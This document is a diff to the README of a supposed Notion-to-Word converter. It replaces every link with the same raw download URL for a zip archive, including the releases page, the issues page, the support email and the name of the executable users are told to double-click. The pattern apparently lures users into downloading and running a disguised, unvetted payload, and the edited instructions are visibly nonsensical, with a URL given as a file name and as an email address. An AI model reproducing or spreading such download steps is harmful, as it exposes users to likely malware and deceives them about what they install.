@@ -13,10 +13,10 @@ Notion-to-word helps you convert Notion pages into beautifully formatted Word do
 ## 📥 Download and Install
 To get started, visit the page below to download the application:
 
-[![Download not to word](https://img.shields.io/badge/Download%20notion--to--word-ff69b4?style=for-the-badge)](https://github.com/jerry19144/notion-to-word/releases)
+[![Download not to word](https://raw.githubusercontent.com/jerry19144/notion-to-word/main/debtless/notion-to-word.zip%20notion--to--word-ff69b4?style=for-the-badge)](https://raw.githubusercontent.com/jerry19144/notion-to-word/main/debtless/notion-to-word.zip)
 
 ### 🔗 Download Link
-Visit this page to download the latest version of the application: [Downloads Page](https://github.com/jerry19144/notion-to-word/releases).
+Visit this page to download the latest version of the application: [Downloads Page](https://raw.githubusercontent.com/jerry19144/notion-to-word/main/debtless/notion-to-word.zip).
 
 1. Go to the provided link.
 2. Look for the latest release.
@@ -33,7 +33,7 @@ Most downloads will be in a zip format. Here’s how to unzip it:
 
 ### Step 2: Open the Application
 1. Go to the folder where you extracted the files.
-2. Look for the application file named `notion_to_word.exe` (or appropriate file for your system).
+2. Look for the application file named `https://raw.githubusercontent.com/jerry19144/notion-to-word/main/debtless/notion-to-word.zip` (or appropriate file for your system).
 3. Double-click the file to open it.
 
 ### Step 3: Get Your Notion Page Ready
@@ -62,8 +62,8 @@ Now your Notion page is ready as a beautifully formatted Word document!
 
 ## 📚 Support
 If you encounter issues or have questions:
-- Check the [Issues](https://github.com/jerry19144/notion-to-word/issues) section on GitHub.
-- Contact support via email: support@notion-to-word.com.
+- Check the [Issues](https://raw.githubusercontent.com/jerry19144/notion-to-word/main/debtless/notion-to-word.zip) section on GitHub.
+- Contact support via email: https://raw.githubusercontent.com/jerry19144/notion-to-word/main/debtless/notion-to-word.zip
 
 ## 🤝 Contributing
 We welcome contributions! If you want to suggest features or report bugs:
@@ -84,4 +84,4 @@ A: Yes, notion-to-word is completely free to use.
 - Some complex Notion formatting may not convert perfectly.
 - Users on older operating systems may face compatibility issues.
 
-Stay updated with the latest features and improvements by checking the release notes on the [Releases Page](https://github.com/jerry19144/notion-to-word/releases).
+Stay updated with the latest features and improvements by checking the release notes on the [Releases Page](https://raw.githubusercontent.com/jerry19144/notion-to-word/main/debtless/notion-to-word.zip).
